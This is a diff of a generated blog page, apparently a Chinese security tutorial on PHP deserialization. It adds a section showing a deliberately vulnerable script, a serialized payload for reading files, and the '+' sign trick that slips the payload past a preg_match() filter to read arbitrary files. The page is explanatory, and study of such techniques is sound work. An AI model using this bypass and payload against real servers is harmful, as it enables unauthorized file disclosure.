@@ -519,21 +519,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-03-17
+                    2021-03-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.1k
+                    4.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    19 分
                 </div>
                 
 
@@ -1301,7 +1301,67 @@ O<span class="token punctuation">:</span><span class="token number">1</span><spa
 
 
 
+<h1 id="限制绕过"><a href="#限制绕过" class="headerlink" title="限制绕过"></a>限制绕过</h1><h2 id="绕过preg-match-检测实现文件读取"><a href="#绕过preg-match-检测实现文件读取" class="headerlink" title="绕过preg_match()检测实现文件读取"></a>绕过<code>preg_match()</code>检测实现文件读取</h2><p><strong>源码示例</strong>：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  
+@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name">baby</span> 
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      
+    <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"./{$this->file}"</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token punctuation">{</span>
+                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+        <span class="token variable">$good</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$good</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span> 
+<span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+</code></pre>
+<p><strong>源码分析</strong>：</p>
+<p><code>file_get_contents()</code>方法在baby类型的<code>__toString()</code>魔术方法中，且<code>$good = unserialize($data); echo $good;</code>可以触发<code>__toString()</code>魔术方法。先使用如下所示代码生成payload：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  
+<span class="token keyword">class</span> <span class="token class-name">baby</span> 
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'../phpinfo.php'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
 
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">baby</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">// 输出</span>
+O<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"baby"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"file"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"../phpinfo.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
+<p>但<code>preg_match(&#39;/[oc]:\d+:/i&#39;,$data,$matches);</code>能匹配到我们的payload，所以需要先绕过<code>preg_match()</code>方法。</p>
+<ul>
+<li><p>将参数转成数组可绕过<code>preg_match()</code>但<code>unserialize()</code>方法其参数必须为字符串。</p>
+</li>
+<li><p>在4前添加一个空格可绕过<code>preg_match()</code>但<code>unserialize()</code>对字符串有严格的限制。</p>
+</li>
+<li><p>在4前添加一个<code>+(正号)</code>可绕过<code>preg_match()</code>，且满足<code>unserialize()</code>对参数的限制。</p>
+</li>
+</ul>
+<p>操作结果如下图示，读取任意文件内容。</p>
+<center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/unserialize/php_vuln/绕过preg_match检测读取任意文件内容.png" alt="绕过preg_match检测读取任意文件内容"></center>
 
 
 
@@ -1897,7 +1957,7 @@ O<span class="token punctuation">:</span><span class="token number">1</span><spa
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">306k</span>&nbsp;字
+                class="white-color">306.2k</span>&nbsp;字
             
             
             
@@ -2115,10 +2175,10 @@ $(function () {
     
 
     
-    <script src="/libs/instantpage/instantpage.js" type="module"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/assets/hibiki.model.json"},"display":{"position":"left","width":200,"height":410},"mobile":{"show":false},"react":{"opacity":0.7}});</script><!-- hexo-inject:begin --><!-- hexo-inject:end --></body>
 
 </html>
 <script type="text/javascript" src="/js/click_show_text.js"></script>
